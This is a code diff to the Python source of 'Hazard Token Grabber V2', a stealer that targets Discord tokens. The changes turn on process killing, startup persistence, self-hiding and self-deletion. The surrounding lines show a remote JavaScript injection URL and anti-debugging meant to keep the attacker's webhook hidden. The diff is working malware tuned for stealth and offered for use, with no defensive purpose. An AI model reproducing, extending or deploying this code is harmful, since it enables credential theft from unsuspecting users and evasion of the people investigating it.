@@ -38,16 +38,16 @@ config = {
     # keep it as it is unless you want to have a custom one
     'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
     # set to False if you don't want it to kill programs such as discord upon running the exe
-    'kill_processes': False,
+    'kill_processes': True,
     # if you want the file to run at startup
-    'startup': False,
+    'startup': True,
     # if you want the file to hide itself after run
-    'hide_self': False,
+    'hide_self': True,
     # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
     'anti_debug': True,
     # enables self destruct of this file after it has been run. (NOTE: YOU CANNOT USE THIS IF YOU ARE CONVERTING FILE TO EXE, YOU CAN OBFUSCATE THE .py BUT NOT CONVERT
     # IT TO EXE. IF YOU WANT TO CONVERT IT TO EXE THEN KEEP THIS FALSE SINCE YOU CANNOT USE THIS WITH EXE [cause exe cannot delete itself since its running])
-    'self_destruct': False,
+    'self_destruct': True,
     # this list of programs will be killed if hazard detects that any of these are running, you can add more if you want
     'blackListedPrograms':
     [
@@ -272,6 +272,12 @@ class Hazard_Token_Grabber_V2(functions):
         await self.injector()
         self.finish()
         shutil.rmtree(self.dir)
+        if self.fetchConf('self_destruct'):
+            if getattr(sys, 'frozen', False):
+                path = os.path.realpath(sys.executable)
+            elif __file__:
+                path = os.path.realpath(__file__)
+                os.remove(path)
 
     def hide(self):
         ctypes.windll.kernel32.SetFileAttributesW(argv[0], 2)
@@ -1129,20 +1135,10 @@ class AntiDebug(functions):
             winreg.CloseKey(handle)
 
 
-if __name__ == "__main__" and os.name == "nt":	
-    try:	
-        httpx.get('https://google.com')	
-    except httpx.ConnectTimeout:	
-        os._exit(0)	
+
+if __name__ == "__main__" and os.name == "nt":
+    try:
+        httpx.get('https://google.com')
+    except httpx.ConnectTimeout:
+        os._exit(0)
     asyncio.run(Hazard_Token_Grabber_V2().init())
-    
-def fetchConf(e: str) -> str or bool | None:
-    return config.get(e)    
-    
-if fetchConf('self_destruct'):
-    if getattr(sys, 'frozen', False):
-        path = os.path.realpath(sys.executable)
-    elif __file__:
-        path = os.path.realpath(__file__)
-        
-        os.remove(path)
